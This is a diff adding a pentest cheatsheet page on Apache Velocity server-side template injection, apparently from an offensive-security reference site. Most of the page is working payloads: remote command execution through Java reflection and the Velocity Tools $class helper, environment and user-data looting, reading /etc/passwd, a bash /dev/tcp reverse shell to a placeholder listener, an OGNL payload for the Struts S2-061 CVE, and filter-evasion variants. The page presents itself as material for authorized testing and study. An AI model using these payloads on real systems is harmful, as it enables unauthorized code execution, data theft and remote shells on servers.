@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Velocity (Java - Liferay, legacy Spring) · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Velocity (Java - Liferay, legacy Spring)</h1><p class="cx-lede">SSTI exploitation in Apache Velocity - Runtime.exec via reflection, $class abuse, and CVE-2020-17530 (Struts) payload form.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059</span><span class="cx-tag">D3FEND D3-EAL</span><span class="cx-tag">IMPACT ServerSideEval, RCE</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Velocity exposes <code>$class</code> and class-instantiation through directives. Reach <code>java.lang.Runtime.getRuntime().exec(...)</code> either through reflection on any object's <code>getClass()</code>, or directly through Velocity Tools' <code>$class</code> helper if it's loaded.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm Velocity (not Freemarker)
+${7*7}                                       # → 49
+#set($x=7)$x                                 # → 7 (Velocity directive)
+
+# RCE - reflection on String&#x27;s getClass()
+#set($s=&quot;&quot;)
+#set($runtime=$s.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null))
+#set($process=$runtime.exec(&quot;id&quot;))
+$process.getInputStream()
+
+# RCE - Velocity Tools $class helper (if loaded)
+$class.inspect(&quot;java.lang.Runtime&quot;).type.getMethod(&quot;getRuntime&quot;).invoke(null).exec(&quot;id&quot;)</code></pre></figure>
+<p>Success indicator: <code>Process</code> object representation in response, or <code>uid=</code> if <code>.getInputStream()</code> is read.</p>
+<h2 id="where-this-engine-lives">Where this engine lives</h2>
+<ul>
+<li><strong>Liferay Portal</strong> - Velocity is one of the supported templating languages alongside Freemarker. Admin templates and themes are common sinks.</li>
+<li><strong>Apache Struts 2</strong> - Velocity views in legacy Struts apps. CVE-2020-17530 (Struts S2-061) is the well-known case.</li>
+<li><strong>Spring Framework (older)</strong> - Velocity view-resolver, deprecated since Spring 4.3 but still present in legacy enterprise apps.</li>
+<li><strong>Confluence (very old)</strong> - pre-Freemarker Confluence versions used Velocity.</li>
+<li><strong>JIRA / Bitbucket Server</strong> - Velocity in some email templates and admin panels.</li>
+</ul>
+<h2 id="step-1-confirm-and-orient">Step 1 - Confirm and orient</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>${7*7}                          # → 49        confirms template eval
+#set($x=7)$x                    # → 7         confirms Velocity (not Freemarker)
+${&quot;&quot;.getClass().getName()}      # → java.lang.String   confirms Java-side access</code></pre></figure>
+<p>If <code>${7*7}</code> works but <code>#set</code> doesn't, that's Freemarker - see <a href="../freemarker/index.html">Freemarker</a>.</p>
+<p>If <code>${"".getClass()}</code> returns unchanged, you're in a hardened Velocity environment (likely with <code>secure_uberspect</code> enabled) - see <a href="../sandbox-escape/index.html">sandbox escape</a>.</p>
+<h2 id="step-2-rce-via-reflection">Step 2 - RCE via reflection</h2>
+<p>Velocity exposes Java methods on any object. From a String, walk to <code>Runtime</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>#set($s=&quot;&quot;)
+#set($cls=$s.getClass().forName(&quot;java.lang.Runtime&quot;))
+#set($getRuntime=$cls.getMethod(&quot;getRuntime&quot;,null))
+#set($runtime=$getRuntime.invoke(null,null))
+#set($process=$runtime.exec(&quot;id&quot;))
+$process.getInputStream()</code></pre></figure>
+<p>Compact inline version:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>#set($r=$s.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null))$r.exec(&quot;id&quot;).getInputStream()</code></pre></figure>
+<p>Reading the InputStream as a string requires Java boilerplate. Easier path:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>#set($process=$s.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec([&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;id &gt; /tmp/out&quot;]))</code></pre></figure>
+<p>Then read <code>/tmp/out</code> via a file primitive - or pipe output through a writer:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>#set($p=$r.exec([&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;id&quot;]))
+#set($is=$p.getInputStream())
+#set($br=$s.getClass().forName(&quot;java.io.BufferedReader&quot;).getConstructor($s.getClass().forName(&quot;java.io.Reader&quot;)).newInstance($s.getClass().forName(&quot;java.io.InputStreamReader&quot;).getConstructor($s.getClass().forName(&quot;java.io.InputStream&quot;)).newInstance($is)))
+$br.readLine()</code></pre></figure>
+<p>Awkward but works. In practice, write to a file and read it via a second request.</p>
+<h2 id="step-3-rce-via-velocity-tools-class">Step 3 - RCE via Velocity Tools <code>$class</code></h2>
+<p>If the application loads Velocity Tools (<code>org.apache.velocity.tools.generic.ClassTool</code>), <code>$class</code> is exposed directly:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>$class.inspect(&quot;java.lang.Runtime&quot;).type.getMethod(&quot;getRuntime&quot;).invoke(null).exec(&quot;id&quot;)</code></pre></figure>
+<p>Much cleaner. Test for <code>$class</code> first:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>$class</code></pre></figure>
+<ul>
+<li>Returns object → <code>$class</code> is loaded; use the clean path</li>
+<li>Returns <code>$class</code> literal or empty → not loaded; use the reflection path</li>
+</ul>
+<p>Velocity Tools is bundled with many Spring/Struts apps but disabled in Liferay's default config.</p>
+<h2 id="step-4-loot-before-escalating">Step 4 - Loot before escalating</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Velocity context dump (Velocity Tools)
+$context.keys
+$class.inspect(&quot;java.lang.System&quot;).type.getProperty(&quot;user.dir&quot;)
+$class.inspect(&quot;java.lang.System&quot;).type.getenv()
+
+# Liferay-specific
+$themeDisplay.user.emailAddress
+$themeDisplay.user.password                  # hashed
+$portletConfig
+
+# System properties (if reachable)
+$s.getClass().forName(&quot;java.lang.System&quot;).getProperty(&quot;user.home&quot;)
+$s.getClass().forName(&quot;java.lang.System&quot;).getProperty(&quot;user.dir&quot;)</code></pre></figure>
+<h2 id="step-5-file-operations">Step 5 - File operations</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Read file via reflection
+#set($fis=$s.getClass().forName(&quot;java.io.FileInputStream&quot;).getConstructor([$s.getClass()]).newInstance(&quot;/etc/passwd&quot;))
+#set($scanner=$s.getClass().forName(&quot;java.util.Scanner&quot;).getConstructor([$s.getClass().forName(&quot;java.io.InputStream&quot;)]).newInstance($fis))
+#set($content=$scanner.useDelimiter(&quot;\A&quot;).next())
+$content</code></pre></figure>
+<p>Or via <code>Files.readAllBytes</code> (Java 7+):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>#set($cls=$s.getClass().forName(&quot;java.nio.file.Files&quot;))
+#set($paths=$s.getClass().forName(&quot;java.nio.file.Paths&quot;))
+#set($pathObj=$paths.getMethod(&quot;get&quot;,[$s.getClass(),$s.getClass().getClass()]).invoke(null,&quot;/etc/passwd&quot;,[]))
+$cls.getMethod(&quot;readString&quot;,[$s.getClass().forName(&quot;java.nio.file.Path&quot;)]).invoke(null,$pathObj)</code></pre></figure>
+<h2 id="step-6-reverse-shell">Step 6 - Reverse shell</h2>
+<p>Use a shell-wrapped exec to handle metacharacters:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>#set($r=$s.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null))
+$r.exec([&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;])</code></pre></figure>
+<p>The array form of <code>exec</code> bypasses Java's argument-parsing rules that break naive <code>exec("bash -i &gt;&amp; ...")</code> calls.</p>
+<h2 id="step-7-cve-2020-17530-struts-s2-061-payload-form">Step 7 - CVE-2020-17530 (Struts S2-061) payload form</h2>
+<p>Apache Struts 2 forced OGNL evaluation through Velocity in S2-061. Payload form (in any Struts-evaluated parameter):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%{
+  (#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).
+  (#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).
+  (#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).
+  (#bean.setBean(#stack)).
+  (#context=#bean.get(&quot;context&quot;)).
+  (#bean.setBean(#context)).
+  (#macc=#bean.get(&quot;memberAccess&quot;)).
+  (#bean.setBean(#macc)).
+  (#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).
+  (#bean.put(&quot;excludedClasses&quot;,#emptyset)).
+  (#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).
+  (#exec=@java.lang.Runtime@getRuntime().exec(&quot;id&quot;)).
+  (#exec.getInputStream())
+}</code></pre></figure>
+<p>This is OGNL syntax (not pure Velocity), but Struts evaluates OGNL through the same code path as Velocity templates. URL-encode and place in a Struts parameter like <code>id</code> or anywhere a Struts action accepts user input.</p>
+<h2 id="filter-aware-variants">Filter-aware variants</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># String concatenation in class names
+#set($cls=$s.getClass().forName(&quot;java.lang.&quot;+&quot;Run&quot;+&quot;time&quot;))
+
+# Hex-encoded class names
+#set($cls=$s.getClass().forName(&quot;java.lang.\u0052untime&quot;))
+
+# Indirect class lookup via static field
+#set($cls=$s.getClass().getSuperclass().getDeclaredClasses())   # then iterate</code></pre></figure>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>${7*7}                                       # eval probe
+#set($x=7)$x                                 # Velocity directive probe (returns 7)
+${context.keys}                              # returns context variable names (Velocity Tools)
+${esc.q}                                     # returns &quot; if EscapeTool loaded - confirms Velocity Tools</code></pre></figure>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong><code>secure_uberspect</code></strong> is Velocity's sandbox setting. When enabled, reflection methods (<code>getClass</code>, <code>getMethod</code>, <code>invoke</code>) are blocked - the reflection-path payloads fail. Velocity Tools' <code>$class.inspect</code> may still work since it routes through a different mechanism.</li>
+<li><strong>Velocity 2.x</strong> introduced stricter introspection by default but kept backward compatibility. Most production deployments still run Velocity 1.7 (frozen since 2010 but ubiquitous).</li>
+<li><strong>Output suppression</strong> - Velocity by default renders unresolved references literally (<code>$undefined</code> returns <code>$undefined</code>). If your reflection chain has a typo, you see the broken reference. This is helpful for debugging - set strict reference mode is rare.</li>
+<li><strong>Cross-engine confusion</strong> - some apps pipe output through both Velocity and Freemarker. If <code>${7*7}</code> returns <code>49</code> and BOTH <code>#set($x=7)$x</code> AND <code>&lt;#assign x=7&gt;${x}</code> return <code>7</code>, the apps have layered templating - both engines are reachable through the same input.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Velocity SSTI on Liferay or legacy Struts apps reaches admin-level Java reflection - file read, command execution, and reverse-shell are all accessible from a single payload. The CVE-2020-17530 path is especially noisy in logs; coordinate with the blue team before using it in monitored environments.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../../ssrf/blind/index.html">Previous: Blind &amp; time-based</a><a class="cx-next" href="../../ssrf/chained/index.html">Next: Chained SSRF</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
